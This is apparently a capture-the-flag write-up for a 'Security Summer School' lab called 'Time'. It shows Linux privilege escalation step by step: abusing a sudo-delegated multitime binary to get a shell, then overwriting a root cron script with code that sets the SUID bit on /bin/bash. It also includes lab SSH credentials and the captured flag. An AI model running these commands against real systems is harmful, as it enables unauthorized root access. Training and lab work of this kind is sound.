---
Name: "Time"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Escalating privileges by abusing delegated command execution and a writable cron script."
---

# Time
```bash
ssh time@sss.upb -p 2023
EDBVCjNFAAzYedCX
```

We take a look at the crontab
```bash
time@time:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/bin/python /home/wormhole/time-travel.py
```

And see that time-travel.py is running periodically, good to know

Lets see what we can run with sudo
```bash
time@time:/home$ sudo -l
[sudo] password for time:
Matching Defaults entries for time on time:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User time may run the following commands on time:
    (wormhole) /usr/bin/multitime
```

Now we inspect it with ghidra
```bash
scp -P 2023 time@sss.upb:/usr/bin/multitime .
```
```bash
time@time:/home$ /usr/bin/multitime
Missing command.
Usage:
  multitime [-f <liketime|rusage>] [-I <replstr>] [-i <stdincmd>]
    [-n <numruns> [-o <stdoutcmd>] [-q] [-s <sleep>] <command>
    [<arg 1> ... <arg n>]
  multitime -b <file> [-f <rusage>] [-q] [-s <sleep>] [-n <numruns>]
```

We can see it is first running a command
```bash
time@time:/home$ /usr/bin/multitime whoami
time
real         0.00
user         0.00
sys          0.00
```

Lets run it as the wormhole user
```bash
sudo -u wormhole /usr/bin/multitime <command> [arguments...]
```
```bash
time@time:/home$ sudo -u wormhole /usr/bin/multitime id
uid=1001(wormhole) gid=1001(wormhole) groups=1001(wormhole)
===> multitime results
1: id
            Mean        Std.Dev.    Min         Median      Max
real        0.001       0.000       0.001       0.001       0.001
user        0.000       0.000       0.000       0.000       0.000
sys         0.001       0.000       0.001       0.001       0.001
```

We can get a shell as wormhole now
```bash
sudo -u wormhole /usr/bin/multitime /bin/bash -i
```

And view the contents of time-travel.py
```python
from datetime import datetime

def back_in_time():
    print("I've built this time machine to get back in time!\n")
    now = datetime.now()

    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print("Current date is...")
    print('.');
    print('.');
    print('.');
    print(dt_string)

    if dt_string:
        print("Fvck... Maybe there is something broke here...")

if __name__ == "__main__":
    back_in_time()
```

Lets replace them with something that gives /bin/bash SUID so we can spawn a shell as root after the cron job runs
```bash
echo "import os; os.system(\"chmod u+s /bin/bash\")" > /home/wormhole/time-travel.py
```

After waiting a few minutes we can become root
```bash
/bin/bash -p
```
```bash
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
flag.txt
bash-5.0# cat flag.txt
flag = SSS{y0u_4r3_k1ll1ng_t1m3}
```

NOTE: We could have just used this command to solve it faster
```bash
sudo -u wormhole /usr/bin/multitime /bin/bash -c 'echo "import os; os.system(\"chmod u+s /bin/bash\")" > /home/wormhole/time-travel.py'
```

